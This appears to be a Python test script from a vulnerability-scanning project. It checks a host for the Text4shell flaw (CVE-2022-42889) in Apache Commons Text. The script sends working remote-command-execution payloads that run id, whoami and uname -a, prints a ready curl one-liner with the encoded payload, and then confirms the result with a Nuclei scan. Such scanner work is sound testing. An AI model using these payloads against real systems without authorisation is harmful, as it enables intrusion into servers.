#!/usr/bin/env python3
"""
Text4shell (CVE-2022-42889) 전용 테스트 스크립트
"""

import sys
import logging
import requests
import urllib.parse
from pathlib import Path

# 프로젝트 루트를 Python 경로에 추가
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.database import get_db, initialize_database
from src.pipeline.scanner_pipeline import ScannerPipeline
from src.pipeline.poc_pipeline import POCPipeline

logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s:%(name)s:%(message)s'
)
logger = logging.getLogger(__name__)


def test_text4shell(target_host: str, port: int = 8080):
    """
    Text4shell 취약점 테스트
    
    Args:
        target_host: 대상 호스트 IP
        port: Text4shell 앱 포트 (기본값: 8080)
    """
    logger.info("=" * 60)
    logger.info("Text4shell (CVE-2022-42889) 취약점 테스트")
    logger.info("=" * 60)
    logger.info(f"대상: http://{target_host}:{port}")
    logger.info("")
    
    base_url = f"http://{target_host}:{port}"
    
    # 1. 서비스 접근 가능 여부 확인
    logger.info("[1/4] 서비스 접근 확인")
    try:
        test_url = f"{base_url}/api/test"
        response = requests.get(test_url, timeout=10)
        if response.status_code == 200:
            logger.info(f"  ✓ 서비스 접근 가능: {test_url}")
        else:
            logger.warning(f"  ⚠ HTTP {response.status_code}: {test_url}")
    except Exception as e:
        logger.error(f"  ✗ 서비스 접근 실패: {e}")
        return False
    
    logger.info("")
    
    # 2. Text4shell PoC 테스트
    logger.info("[2/4] Text4shell PoC 테스트")
    
    # 여러 페이로드 시도
    payloads = [
        "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
        "${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}",
        "${script:javascript:java.lang.Runtime.getRuntime().exec('uname -a')}",
    ]
    
    vulnerable = False
    for payload in payloads:
        try:
            # GET /api/interpolate 엔드포인트 테스트
            encoded_payload = urllib.parse.quote(payload)
            url = f"{base_url}/api/interpolate?input={encoded_payload}"
            
            logger.info(f"  - 페이로드 테스트: {payload[:50]}...")
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                response_text = response.text
                # 명령 실행 결과 확인
                if any(keyword in response_text.lower() for keyword in ["uid=", "gid=", "root", "ec2-user", "linux"]):
                    logger.info(f"  ✓ 취약점 확인됨! (페이로드: {payload[:50]}...)")
                    logger.info(f"    응답: {response_text[:200]}")
                    vulnerable = True
                    break
                else:
                    logger.debug(f"    응답: {response_text[:200]}")
        except Exception as e:
            logger.warning(f"  ⚠ 페이로드 테스트 실패: {e}")
            continue
    
    if not vulnerable:
        logger.warning("  ⚠ Text4shell 취약점이 자동으로 확인되지 않았습니다.")
        logger.info("    수동 테스트를 권장합니다:")
        logger.info(f"    curl '{base_url}/api/interpolate?input=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec%28%27id%27%29%7D'")
    
    logger.info("")
    
    # 3. Nuclei 스캔으로 재확인
    logger.info("[3/4] Nuclei 스캔으로 재확인")
    scanner_pipeline = ScannerPipeline()
    
    nuclei_result = scanner_pipeline.run_nuclei_scan(
        target=base_url,
        save_to_db=True
    )
    
    if nuclei_result.get("status") == "completed":
        findings = nuclei_result.get("findings", [])
        text4shell_found = False
        for finding in findings:
            info = finding.get("info", {})
            name = str(info.get("name", "")).lower()
            if "text4shell" in name or "cve-2022-42889" in str(info).lower():
                text4shell_found = True
                logger.info(f"  ✓ Nuclei에서 Text4shell 탐지됨!")
                logger.info(f"    제목: {info.get('name', 'N/A')}")
                logger.info(f"    심각도: {info.get('severity', 'N/A')}")
                break
        
        if not text4shell_found:
            logger.warning("  ⚠ Nuclei에서 Text4shell을 탐지하지 못했습니다.")
            logger.info(f"    총 발견: {len(findings)}개")
    else:
        logger.warning(f"  ⚠ Nuclei 스캔 실패: {nuclei_result.get('error')}")
    
    logger.info("")
    
    # 4. 결과 요약
    logger.info("[4/4] 테스트 결과 요약")
    logger.info("=" * 60)
    logger.info(f"대상: {base_url}")
    logger.info(f"서비스 접근: {'✓ 성공' if response.status_code == 200 else '✗ 실패'}")
    logger.info(f"Text4shell 취약점: {'✓ 확인됨' if vulnerable else '⚠ 확인되지 않음'}")
    logger.info("")
    logger.info("다음 단계:")
    logger.info("  1. 대시보드에서 결과 확인")
    logger.info("  2. 리포트 생성")
    logger.info("=" * 60)
    
    return vulnerable


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Text4shell (CVE-2022-42889) 취약점 테스트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python scripts/test/test_text4shell.py --target 13.125.220.26
  python scripts/test/test_text4shell.py --target 13.125.220.26 --port 8080
        """
    )
    parser.add_argument(
        "--target",
        type=str,
        required=True,
        help="대상 호스트 IP 주소"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8080,
        help="Text4shell 앱 포트 (기본값: 8080)"
    )
    
    args = parser.parse_args()
    
    # IP 주소 정리
    target = args.target.strip().lstrip("$")
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    
    success = test_text4shell(target, args.port)
    sys.exit(0 if success else 1)

